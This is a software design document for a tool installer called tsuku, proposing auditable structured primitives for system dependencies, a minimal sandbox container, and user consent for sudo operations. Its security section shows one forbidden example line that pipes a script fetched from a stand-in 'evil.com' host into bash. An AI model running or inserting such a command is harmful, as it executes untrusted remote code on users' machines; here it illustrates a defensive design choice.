# DESIGN: Structured install_guide for System Dependencies

## Status

Proposed

## Upstream Design Reference

This design implements part of [DESIGN-golden-plan-testing.md](DESIGN-golden-plan-testing.md).

**Relevant sections:**
- Blocker: Structured install_guide for System Dependencies (lines 1465-1515)
- The acceptance criteria for enabling complete golden plan coverage

**Blocking relationship:**
- Issue #745 (enforce golden files for all recipes) is blocked by this design
- Issue #722 (this design) must be completed before #745 can proceed
- Upon completion, all recipes including those with `require_system` steps can be sandbox-tested

## Context and Problem Statement

Recipes with `require_system` steps cannot be execution-validated in the sandbox because the required system packages are not installed in the container. The current `install_guide` field contains free-form text instructions, not machine-parseable package specifications.

**Current state:**

```toml
[[steps]]
action = "require_system"
command = "docker"

[steps.install_guide]
darwin = "brew install --cask docker"
linux = "See https://docs.docker.com/engine/install/"
```

The sandbox executor cannot parse "brew install --cask docker" to install Docker automatically. This creates a gap in test coverage: recipes with system dependencies can have golden plans generated, but cannot be validated in sandbox containers.

**Why this matters:**

1. **Incomplete golden coverage**: Issue #745 (enforce golden files for all recipes) is blocked on this issue. Some recipes cannot be sandbox-tested.

2. **Accidental dependencies**: The current sandbox base containers (`debian:bookworm-slim`, `ubuntu:22.04`) include hundreds of pre-installed packages. Recipes tested in these environments may work due to packages "accidentally" present - `ca-certificates`, `tar`, `gzip`, `curl`, shell utilities, shared libraries. A truly minimal environment would expose these hidden assumptions.

3. **Platform gaps**: Free-form text cannot reliably tell the sandbox executor which packages to install on which platform.

4. **Scale requirements**: Tsuku aims to support tens of thousands of tools - anything available via Homebrew, supported ecosystems, or GitHub releases. At that scale, the long tail of tools will have diverse system requirements. The design must be robust and extensible enough to handle patterns we haven't encountered yet.

**Scope:**

This design addresses structured package specifications for the `require_system` action. It does NOT cover:
- Tsuku installing system packages directly (tsuku remains non-root)
- Replacing package managers (apt, brew, etc.)
- Container image management as a user-facing feature

## Decision Drivers

1. **Backwards compatibility**: Existing recipes with free-form `install_guide` must continue to work.

2. **Incremental adoption**: Recipe authors should be able to add structured specs gradually.

3. **Platform coverage**: The format must support apt, brew, dnf, pacman, and potentially others.

4. **Sandbox enablement**: The format must be machine-parseable for container provisioning.

5. **Simplicity**: Recipe authors should not need to learn complex syntax.

## Considered Options

### Decision 1: Format for Structured Package Specs

How should package specifications be represented in TOML?

#### Option 1A: Nested Tables

```toml
[steps.install_guide.linux]
apt = ["docker.io"]
text = "Or visit docker.com"

[steps.install_guide.darwin]
brew = { packages = ["docker"], cask = true }
```

**Pros:**
- Clear separation of platforms
- Native TOML structure
- Easy to add new fields per platform

**Cons:**
- Verbose for simple cases
- Breaking change to current string format
- Requires migration of all existing recipes

#### Option 1B: Inline Table with Package Arrays

```toml
[steps.install_guide]
linux = { apt = ["docker.io"], text = "Or see docs.docker.com" }
darwin = { brew = ["docker"], cask = true }
fallback = "Visit docker.com for installation instructions"
```

**Pros:**
- Compact representation
- Clearly distinguishes structured from text-only entries
- String values provide fallback behavior

**Cons:**
- Still requires migration
- Mixed string/table values may confuse authors

#### Option 1C: Declarative Requirements with Structured Primitives

Replace `install_guide` with a declarative `packages` field that specifies *what* is needed using structured primitives. Tsuku executes these primitives directly (with user consent) or generates human-readable instructions.

**Simple case (single package):**
```toml
[[steps]]
action = "require_system"
command = "docker"

[steps.packages]
linux = { apt = ["docker.io"] }
darwin = { brew = ["docker"], cask = true }
```

**Complex case (repository + packages + post-install):**
```toml
[[steps]]
action = "require_system"
command = "docker"

[steps.packages.linux]
primitives = [
  { apt_repo = { url = "https://download.docker.com/linux/ubuntu", key_url = "https://download.docker.com/linux/ubuntu/gpg", key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570" } },
  { apt = ["docker-ce", "docker-ce-cli", "containerd.io"] },
  { group_add = { user = "$USER", group = "docker" } },
  { service_enable = "docker" },
]

[steps.packages.darwin]
primitives = [
  { brew_cask = ["docker"] },
]
```

**Key constraint: No shell primitive.** All operations use structured primitives that can be statically analyzed and audited. New primitives require code changes (higher review bar).

**Pros:**
- Machine-executable: tsuku can install system deps (with user consent)
- Auditable: no arbitrary shell commands, only known primitives
- Extensible: new primitives added as patterns emerge
- Content-addressed: external URLs require SHA256 hashes
- Single source of truth for both automation and user display

**Cons:**
- Breaking change to current `install_guide` format
- Requires defining primitive vocabulary upfront
- Complex installations need multiple primitives
- New patterns require code changes to add primitives

### Decision 2: Base Container Strategy

What should the sandbox base container contain?

#### Option 2A: Minimal Container (tsuku + glibc only)

Strip the base container to absolute minimum. Every dependency must be declared.

**Pros:**
- Forces complete dependency declarations
- No "accidental" dependencies masking recipe bugs
- Reproducible across container runtimes

**Cons:**
- Many existing recipes will fail until annotated (currently ~3 recipes with `require_system`, but number may grow)
- Initial migration effort to annotate all affected recipes
- Slower sandbox runs (more packages to install per recipe)
- Base container construction is non-trivial (glibc, locale-archive, SSL certs may all be needed)

#### Option 2B: Current Approach (debian:bookworm-slim)

Keep the current base images with their standard package sets.

**Pros:**
- No migration effort
- Faster sandbox runs for simple tools
- Matches common developer environments

**Cons:**
- Recipes may work due to undeclared dependencies
- Different base images have different packages
- Doesn't catch missing dependency declarations

#### Option 2C: Curated Base Container

Create a custom tsuku base image with a known set of common packages.

**Pros:**
- Controlled environment
- Balance between minimal and practical
- Can version and maintain the image

**Cons:**
- Adds maintenance burden (building/publishing images)
- Still doesn't force complete dependency declarations
- Extra infrastructure to manage

### Decision 3: Package Manager Coverage

Which package managers should the structured format support?

#### Option 3A: Core Package Managers Only

Support the most common package managers: `apt`, `brew`, `dnf`.

**Pros:**
- Covers vast majority of use cases
- Simpler implementation
- Easier to test and maintain

**Cons:**
- Users of Arch (pacman), Alpine (apk) must use fallback text
- Limits adoption in some ecosystems

#### Option 3B: Comprehensive Package Manager Support

Support: `apt`, `brew`, `dnf`, `pacman`, `apk`, `zypper`, `emerge`.

**Pros:**
- Broader platform coverage
- More recipes can be fully structured

**Cons:**
- Testing burden increases
- Maintenance of multiple package manager integrations
- Some managers rarely used in practice

#### Option 3C: Extensible with Core Defaults

Support core managers (apt, brew, dnf) with an extensible schema for adding others.

**Pros:**
- Pragmatic initial scope
- Clear path for expansion
- Community can request additions

**Cons:**
- Initial recipes limited to core managers
- Schema evolution requires careful design

## Decision Outcome

**Chosen: 1C + 2A + 3C**

### Summary

We replace the free-form `install_guide` field with a structured `packages` field using a vocabulary of auditable primitives. No shell commands are allowed - all operations use primitives that can be statically analyzed. The sandbox base container is stripped to minimal (tsuku + glibc only), forcing complete dependency declarations. We support core package managers initially with an extensible primitive system.

### Rationale

The combination of structured primitives (1C) and minimal container (2A) provides the best balance of security, expressiveness, and extensibility:

- **No shell, only primitives**: Arbitrary shell commands with sudo are a security risk that cannot be statically analyzed. By restricting to known primitives (`apt`, `apt_repo`, `brew`, `group_add`, `service_enable`), every recipe can be audited.

- **Machine-executable**: Primitives are designed to be executed by tsuku (with user consent), not just displayed. This enables automated installation of system dependencies.

- **Content-addressed resources**: All external URLs (GPG keys, repository definitions) require SHA256 hashes. This prevents TOCTOU attacks where resources change between review and installation.

- **Forced completeness**: The minimal base container exposes hidden dependencies. If a recipe works in `debian:bookworm-slim` but fails in the minimal container, it has undeclared dependencies.

- **Extensible vocabulary**: New primitives are added through code changes as patterns emerge. This creates a higher review bar than allowing arbitrary shell commands.

Why not Option 1A or 1B:
- Option 1A is verbose for simple cases
- Option 1B mixes string and table values, confusing authors
- Neither addresses the shell command security problem

Why Option 2A (minimal container) over 2B (current) or 2C (curated):
- 2A exposes hidden dependencies that 2B masks
- At scale (tens of thousands of tools), hidden dependencies become a major problem
- 2C doesn't solve the underlying issue

Why Option 3C (extensible core) over 3A or 3B:
- Start with proven patterns (apt, brew, dnf)
- Add primitives as we encounter new patterns during recipe migration
- Avoids over-engineering upfront while providing clear extension path

## Solution Architecture

### Design Principles

1. **No shell commands**: All operations use structured primitives that can be statically analyzed
2. **Content-addressed resources**: All external URLs require SHA256 hashes
3. **Explicit user consent**: Privileged operations require user confirmation
4. **Extensible vocabulary**: New primitives added through code as patterns emerge

### Package Specification Schema

The `packages` field replaces the current `install_guide` field. It supports two forms:

**Simple form** (shorthand for common cases):
```toml
[steps.packages]
linux = { apt = ["docker.io"] }
darwin = { brew_cask = ["docker"] }
```

**Full form** (ordered primitives for complex installations):
```toml
[steps.packages.linux]
primitives = [
  { apt_repo = { url = "https://download.docker.com/linux/ubuntu", key_url = "https://download.docker.com/linux/ubuntu/gpg", key_sha256 = "1500c1f..." } },
  { apt = ["docker-ce", "docker-ce-cli", "containerd.io"] },
  { group_add = { group = "docker" } },
  { service_enable = "docker" },
]
```

Platform key resolution follows the same hierarchy as the old `install_guide`:
1. Exact tuple match (e.g., "linux/amd64")
2. OS match (e.g., "linux")
3. "fallback" key

### Primitive Vocabulary (Initial Set)

Primitives are the atomic operations tsuku can execute. Each primitive has well-defined behavior and required parameters.

**Package Installation:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `apt` | packages: []string | sudo | Install Debian/Ubuntu packages |
| `apt_repo` | url, key_url, key_sha256 | sudo | Add APT repository with GPG key |
| `dnf` | packages: []string | sudo | Install Fedora/RHEL packages |
| `dnf_repo` | url, key_url, key_sha256 | sudo | Add DNF repository |
| `brew` | packages: []string | user | Install Homebrew formulae |
| `brew_cask` | packages: []string | user | Install Homebrew casks |

**System Configuration:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `group_add` | group: string | sudo | Add current user to group |
| `service_enable` | service: string | sudo | Enable systemd service |
| `service_start` | service: string | sudo | Start systemd service |

**Fallback:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `manual` | text: string | none | Display instructions for manual installation |

### Content-Addressing Requirements

All external resources must be content-addressed to prevent TOCTOU attacks:

```toml
# REQUIRED: key_sha256 must be present
{ apt_repo = {
    url = "https://download.docker.com/linux/ubuntu",
    key_url = "https://download.docker.com/linux/ubuntu/gpg",
    key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570"
} }

# ERROR: Missing key_sha256
{ apt_repo = { url = "...", key_url = "..." } }
```

Preflight validation rejects recipes with unhashed external resources.

### Primitive Execution

When tsuku executes primitives (in sandbox or with user consent):

```go
type Primitive interface {
    // Validate checks parameters without side effects
    Validate() error

    // RequiresPrivilege returns true if sudo is needed
    RequiresPrivilege() bool

    // Execute performs the operation
    Execute(ctx *ExecutionContext) error

    // Describe returns human-readable description for consent prompt
    Describe() string
}

// Example: apt primitive
type AptPrimitive struct {
    Packages []string
}

func (p *AptPrimitive) Execute(ctx *ExecutionContext) error {
    args := append([]string{"install", "-y"}, p.Packages...)
    return ctx.RunPrivileged("apt-get", args...)
}

func (p *AptPrimitive) Describe() string {
    return fmt.Sprintf("Install packages: %s", strings.Join(p.Packages, ", "))
}
```

### User Consent Flow

Before executing privileged primitives, tsuku displays what will happen:

```
$ tsuku install docker

This recipe requires system-level changes:

  1. Add APT repository: https://download.docker.com/linux/ubuntu
     GPG key: sha256:1500c1f56fa9e26b9b8f42452a...
  2. Install packages: docker-ce, docker-ce-cli, containerd.io
  3. Add user to group: docker
  4. Enable service: docker

These operations require sudo privileges.

Proceed? [y/N/details]
```

The `details` option shows the exact commands that will be executed.

### Human-Readable Text Generation

For display purposes (when not executing), tsuku generates instructions from primitives:

```go
func GenerateInstallGuide(primitives []Primitive) string {
    var steps []string
    for _, p := range primitives {
        steps = append(steps, p.Describe())
    }
    return strings.Join(steps, "\n")
}
```

Output example:
```
1. Add APT repository: https://download.docker.com/linux/ubuntu
2. Run: sudo apt-get install docker-ce docker-ce-cli containerd.io
3. Add current user to 'docker' group
4. Enable systemd service: docker
```

### Extension Model

New primitives are added when patterns emerge during recipe migration:

1. **Identify pattern**: Multiple recipes need similar operation
2. **Design primitive**: Define parameters, validation, execution
3. **Implement in Go**: Add to `internal/actions/primitives/`
4. **Add to vocabulary**: Update schema validation
5. **Document**: Add to primitive table above

This creates a higher review bar than shell commands - every new operation type requires code review.

**Anticipated future primitives:**
- `pacman`, `apk`, `zypper` - Additional package managers
- `sysctl_set` - Kernel parameter configuration
- `file_write` - Write configuration files (with path allowlist)
- `env_set` - Set environment variables

### Minimal Base Container

Create a new base container with only:

```dockerfile
FROM scratch
COPY --from=builder /tsuku /usr/local/bin/tsuku
COPY --from=builder /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/
COPY --from=builder /lib64/ld-linux-x86-64.so.2 /lib64/
# ... minimal runtime dependencies for tsuku binary
```

The container cannot run `apt-get` or any package manager. Instead, the sandbox executor builds a derived container with the required packages:

```dockerfile
FROM tsuku/sandbox-base:latest
RUN apt-get update && apt-get install -y docker.io
```

### Sandbox Executor Changes

The sandbox executor is modified to:

1. **Extract package specs**: Parse `require_system` steps from the plan, extract `packages` for the target platform.

2. **Compute container image**: Generate a Dockerfile from the base image plus required packages. Hash the package list for caching.

3. **Build or retrieve container**: Check if an image with the package set hash exists. If not, build it.

4. **Run sandbox test**: Use the derived container for sandbox execution.

```go
// DeriveContainerSpec extracts system packages from a plan's require_system steps.
// Returns (spec, nil) for recipes with complete package specs.
// Returns (nil, nil) for recipes with no require_system steps.
// Returns (nil, UnsupportedRecipeError) for recipes with require_system but no packages.
func DeriveContainerSpec(plan *executor.InstallationPlan, os, arch string) (*ContainerSpec, error) {
    spec := &ContainerSpec{
        Base:     MinimalBaseImage,
        Packages: make(map[string][]string),
    }

    hasRequireSystem := false
    for _, step := range plan.Steps {
        if step.Action != "require_system" {
            continue
        }
        hasRequireSystem = true

        packages, ok := step.Params["packages"]
        if !ok {
            // No structured packages - skip this recipe for sandbox testing
            // Caller should log warning and skip, not fail
            return nil, &UnsupportedRecipeError{
                Recipe:  plan.Tool,
                Command: step.Params["command"].(string),
                Reason:  "missing 'packages' field for sandbox automation",
            }
        }

        platformPackages := resolvePlatformPackages(packages, os, arch)
        for manager, pkgs := range platformPackages {
            spec.Packages[manager] = append(spec.Packages[manager], pkgs...)
        }
    }

    if !hasRequireSystem {
        return nil, nil // No system dependencies - use default container
    }

    return spec, nil
}
```

**Handling recipes without `packages`**:

When `DeriveContainerSpec` returns `UnsupportedRecipeError`, the sandbox executor logs a warning and skips sandbox testing for that recipe:

```
WARN: Skipping sandbox test for 'docker' - require_system step for 'docker' missing 'packages' field
```

This allows incremental migration: existing recipes continue to work for users, but sandbox validation is skipped until `packages` is added. CI reports track which recipes need migration.

### Container Image Caching

To avoid rebuilding containers for every test, cache images by package set:

```go
// ContainerImageName generates a deterministic image name for a package set.
func ContainerImageName(spec *ContainerSpec) string {
    // Sort packages for deterministic hash
    var parts []string
    for manager, pkgs := range spec.Packages {
        sort.Strings(pkgs)
        for _, pkg := range pkgs {
            parts = append(parts, fmt.Sprintf("%s:%s", manager, pkg))
        }
    }
    sort.Strings(parts)

    hash := sha256.Sum256([]byte(strings.Join(parts, "\n")))
    return fmt.Sprintf("tsuku/sandbox-cache:%s", hex.EncodeToString(hash[:8]))
}
```

The cache can be local (podman/docker image cache) or remote (GHCR for CI).

### Recipe Validation

Add preflight validation for `require_system` when `packages` is present:

```go
func (a *RequireSystemAction) Preflight(params map[string]interface{}) *PreflightResult {
    result := &PreflightResult{}

    // Existing validation...

    // Validate packages structure if present
    if packages, ok := params["packages"]; ok {
        if err := validatePackagesStructure(packages); err != nil {
            result.AddError("invalid packages structure: %s", err)
        }
    }

    return result
}
```

### Migration Path

1. **Phase 1**: Add `packages` field support to `require_system` action. Deprecate `install_guide` but continue to support it for backwards compatibility. Recipes with only `install_guide` are skipped for automated sandbox testing with a deprecation warning.

2. **Phase 2**: Create minimal base container. Update sandbox executor to use derived containers when `packages` is present.

3. **Phase 3**: Migrate existing recipes from `install_guide` to `packages`. Only ~3 recipes currently use `require_system`, so migration is manageable.

4. **Phase 4**: Remove `install_guide` support after all recipes are migrated. Require `packages` for new recipes with `require_system`.

## Implementation Approach

### Phase 1: Primitive Framework

1. Create `internal/actions/primitives/` package with `Primitive` interface
2. Implement core primitives: `apt`, `apt_repo`, `brew`, `brew_cask`, `manual`
3. Add primitive parsing from TOML (simple and full forms)
4. Add preflight validation (content-addressing, parameter validation)
5. Implement `Describe()` for human-readable output generation
6. Deprecate `install_guide` with warning (continue to support temporarily)

### Phase 2: Sandbox Execution

1. Create minimal base container Dockerfile (tsuku + glibc only)
2. Publish base image to GHCR (tsukumogami/sandbox-base)
3. Implement primitive execution in sandbox context (root in container)
4. Add container image caching by primitive hash
5. Integrate with existing sandbox executor

### Phase 3: User Consent and Host Execution

1. Implement user consent flow (display primitives, confirm)
2. Add `--system-deps` flag to `tsuku install` to enable host execution
3. Implement privilege escalation (sudo) for host execution
4. Add audit logging for privileged operations
5. Add dry-run mode (`--dry-run`) to show what would be executed

### Phase 4: Recipe Migration and Extension

1. Migrate docker.toml, cuda.toml, test-tuples.toml to new format
2. Verify sandbox testing and host execution work
3. Add primitives as needed: `dnf`, `dnf_repo`, `group_add`, `service_enable`
4. Strip sandbox base container further as hidden dependencies are discovered
5. Update CONTRIBUTING.md with primitive documentation
6. Create tracking issue for full recipe registry migration

## Security Considerations

### Trust Model

This design uses a layered trust model with explicit boundaries:

| Layer | Trust Source | Verification |
|-------|-------------|--------------|
| Recipe content | PR review by maintainers | Human review |
| External resources | Content-addressing (SHA256) | Automated hash verification |
| Package managers | Distribution signatures | apt/dnf GPG, Homebrew checksums |
| Primitive operations | Fixed vocabulary in tsuku code | Code review for new primitives |

**Key security property**: No arbitrary shell commands. All operations use primitives with well-defined, auditable behavior. This enables static analysis of what a recipe will do.

### Download Verification

**External resources are content-addressed.** All URLs in primitives (GPG keys, repository definitions) require SHA256 hashes:

```toml
{ apt_repo = {
    url = "https://download.docker.com/linux/ubuntu",
    key_url = "https://download.docker.com/linux/ubuntu/gpg",
    key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570"
} }
```

This prevents TOCTOU attacks where resources change between review and installation. Preflight validation rejects recipes with unhashed resources.

Package installation uses trusted package managers (apt, brew, dnf) which handle their own verification (GPG signatures for apt/dnf, SHA256 for Homebrew).

### Execution Isolation

**Sandbox context (containers):**
- Primitives execute as root inside the container
- Container is ephemeral - destroyed after test
- No host filesystem access beyond explicit mounts
- Resource limits (memory, CPU, process count)
- No host network unless explicitly required

**Host context (user machine):**
- Primitives execute via sudo with explicit user consent
- User must confirm each privileged operation
- Audit log records what was executed
- Dry-run mode available to preview operations

**Why no shell primitive:**
```toml
# NOT ALLOWED - arbitrary code execution
{ shell = "curl evil.com/backdoor.sh | bash" }

# ALLOWED - well-defined, auditable operation
{ apt = ["docker-ce"] }
```

Once shell commands are allowed, static analysis becomes impossible. The attacker surface expands to any shell syntax, variable expansion, subshells, etc.

### Supply Chain Risks

**Package manager trust**: This design trusts apt, brew, and dnf repositories. An attacker who compromises these repositories could inject malicious packages. This is an existing risk for anyone using these package managers - tsuku does not add new trust requirements.

**Recipe review**: All primitives are visible in the TOML recipe. Reviewers can audit:
- Which packages are installed
- Which repositories are added (with their GPG keys)
- Which groups the user is added to
- Which services are enabled

**Primitive vocabulary control**: New primitives require code changes to tsuku, creating a higher review bar than allowing arbitrary shell commands.

**Content-addressing**: External URLs must have SHA256 hashes computed at review time. If an upstream resource changes, the hash check fails and installation is blocked.

### User Data Exposure

**Sandbox context:**
- No user data mounted into container
- Only recipe plan, download cache, and tsuku binary (all read-only)
- Container destroyed after execution

**Host context:**
- Primitives operate on system paths (e.g., `/etc/apt/sources.list.d/`)
- No access to user home directory or personal files
- Operations logged for audit trail

## Future Work

The following items were identified during design review but are deferred for post-MVP implementation. They represent scaling considerations that will become relevant as the primitive vocabulary and recipe count grow.

### Tiered Extension Model

The current design requires Go code changes for every new primitive. At scale (tens of thousands of recipes), this creates friction. A future tiered extension model could include:

1. **Core primitives (Go)**: Security-sensitive operations (apt_repo, group_add, service_enable) that require full code review
2. **Composite primitives (TOML)**: Combinations of core primitives defined in recipe syntax (e.g., `add_docker_repo` = apt_repo + apt)
3. **Verified scripts**: Reviewed shell scripts with attestation, for edge cases that don't fit the primitive model

This would balance security (core primitives) with extensibility (composites and verified scripts).

### Automatic Primitive Analysis

A `tsuku analyze <recipe>` command could:

1. Parse existing `install_guide` text instructions
2. Propose structured `packages` primitives
3. Identify external resources needing SHA256 hashes
4. Suggest migration patches

This would accelerate migration when scaling to thousands of recipes.

### Platform Version Constraints

The current design treats "linux" as uniform, but apt packages vary by distribution version:

```toml
[steps.packages."linux/ubuntu-24.04"]
apt = ["docker-ce"]

[steps.packages."linux/ubuntu-22.04"]
apt = ["docker.io"]
```

Future work should define the platform key grammar and version matching semantics.

### Container Cache Optimization

At scale, the content-addressed cache may grow large. Future optimizations:

- **Layered caching**: Share common package sets across recipes
- **Cache eviction**: LRU or reference-counted cleanup
- **Remote cache**: GHCR or S3-backed cache for CI

### Privilege Escalation Paths

Certain primitives (`group_add`, `file_write`, `service_enable`) enable indirect privilege escalation. Future work should:

- Document which primitives create escalation paths
- Consider allowlisting for sensitive primitives (e.g., only specific groups allowed)
- Add runtime checks in host execution context

## Consequences

### Positive

- **Complete golden coverage**: All recipes can be sandbox-tested, including those with system dependencies.
- **Explicit dependencies**: The minimal base container forces recipes to declare all required packages.
- **Machine-executable**: Tsuku can install system dependencies automatically (with user consent).
- **Auditable**: No shell commands - every operation uses a primitive that can be statically analyzed.
- **Content-addressed**: External resources are pinned by SHA256, preventing TOCTOU attacks.
- **Extensible**: New primitives can be added as patterns emerge during recipe migration.

### Negative

- **Infrastructure**: Requires building and publishing minimal base container images.
- **Primitive vocabulary**: Complex installations may require multiple primitives or new primitive types.
- **Extension overhead**: New patterns require code changes to add primitives (by design, but adds friction).
- **Migration effort**: Existing recipes with `require_system` need conversion to primitives.

### Mitigations

- **Infrastructure**: GitHub Actions can build and publish base images on release.
- **Primitive vocabulary**: Start with common patterns (apt, brew, dnf); add primitives as needed.
- **Extension overhead**: The overhead is intentional - it creates a review gate for new operation types.
- **Migration**: Only ~3 recipes currently use `require_system`. Migration is manageable and will expose patterns for additional primitives.
